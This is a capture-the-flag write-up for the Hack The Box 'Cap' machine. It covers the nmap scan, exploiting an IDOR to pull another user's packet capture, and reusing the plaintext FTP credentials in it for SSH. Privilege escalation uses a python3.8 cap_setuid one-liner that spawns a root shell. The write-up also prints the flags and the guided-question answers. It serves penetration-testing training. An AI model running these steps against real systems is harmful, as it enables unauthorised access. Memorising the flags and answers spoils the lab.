# HTB Writeup: Cap

**Difficulty:** Easy
**Target IP:** 10.129.42.83
**Platform:** Hack The Box

## Description

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions, including performing network captures. Improper access controls result in an Insecure Direct Object Reference (IDOR), giving access to another user's capture. That capture contains plaintext credentials, which are used to gain a foothold. A Linux capability is then leveraged to escalate to root.

## 1. Reconnaissance

Quick version/script scan:

```bash
nmap -sV -sC 10.129.42.83
```

```
Nmap scan report for 10.129.42.83
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Three services: **FTP (21)**, **SSH (22)**, and an **HTTP app on port 80** served by Gunicorn, titled "Security Dashboard".

`curl -i` against port 80 confirms a Flask/Gunicorn-backed admin dashboard (Bootstrap-based theme, "Security Dashboard" title). The sidebar navigation is the interesting part — it exposes the app's functional routes:

```
/            → Dashboard
/capture     → Security Snapshot (5 Second PCAP + Analysis)
/ip          → IP Config
/netstat     → Network Status
```

The `/capture` route — a feature that captures live network traffic — immediately stands out as worth digging into.

## 2. Enumeration

The dashboard includes a feature to capture a 5-second snapshot of web traffic. Triggering it as the logged-in user returns an ID in the URL, e.g. `/data/1#`. Since I was "user 1", that implied other numbered captures might exist.

Manually switching the ID to `3` and `4` in the URL worked without any additional authentication — a classic **IDOR** (Insecure Direct Object Reference): the app trusts the client-supplied ID instead of verifying the requester owns that capture.

Each downloaded capture is a Wireshark-readable packet file. Following the same logic, if capture `1` was me, capture `0` was likely the very first user — probably the admin. Pulling `/data/0#` and downloading the file exposed the admin's own traffic, including a plaintext **FTP** login captured in the PCAP:

```
USER: nathan
PASSWORD: Buck3tH4TF0RM3!
```

No bruteforcing needed — the credentials were sitting in plaintext inside a capture the app should never have let me access.

## 3. Exploitation

Logged into **FTP** with the `nathan` credentials and retrieved `user.txt`:

```
ddd430785176016f81c40204d747857e
```

The same credentials worked over **SSH**, giving a shell as `nathan`.

### Privilege Escalation

Rather than wandering the filesystem hoping to stumble on something, enumeration should be systematic. The single most productive check on this box is **Linux capabilities**:

```bash
getcap -r / 2>/dev/null
```

Capabilities let a binary hold a specific slice of root's power without being fully SUID root — normally a security feature, but if the wrong binary gets the wrong capability, it becomes a privilege-escalation vector.

The scan showed a capability set directly on the Python 3.8 binary (`/usr/bin/python3.8`) — specifically `cap_setuid`. That's enough to set the process UID to 0 from within Python itself:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Running that drops into a root shell. From there, `root.txt`:

```
fa943abef14ab3a7b629894fc8061695
```

## 4. Guided Questions / Tasks

| # | Question | Answer |
|---|----------|--------|
| a | How many services are shown in the Nmap scan? | `3` — FTP, SSH, HTTP |
| b | What does the IDOR URL path segment that holds the capture ID start with? | `data` |
| c | Is it possible to access another user's capture without authentication? | `yes` |
| d | Which capture ID belongs to the admin user? | `0` |
| e | Which plaintext service credentials were recovered from the capture? | `ftp` |
| f | Which service were those same credentials reused on for the initial shell? | `ssh` |
| g | Which binary held the capability abused for privilege escalation? | `/usr/bin/python3.8` |

## 5. Flags

- **User flag:** `ddd430785176016f81c40204d747857e`
- **Root flag:** `fa943abef14ab3a7b629894fc8061695`

## Key Takeaways

- **IDOR is cheap to find and devastating when it hits sensitive data.** A sequential, unauthenticated ID in a URL is always worth testing by hand.
- **Packet captures can leak more than the app intends.** A "security" feature became the vulnerability.
- **`getcap -r /` should be one of the first privesc checks on any Linux box** — it's fast and frequently productive on easy-rated machines.
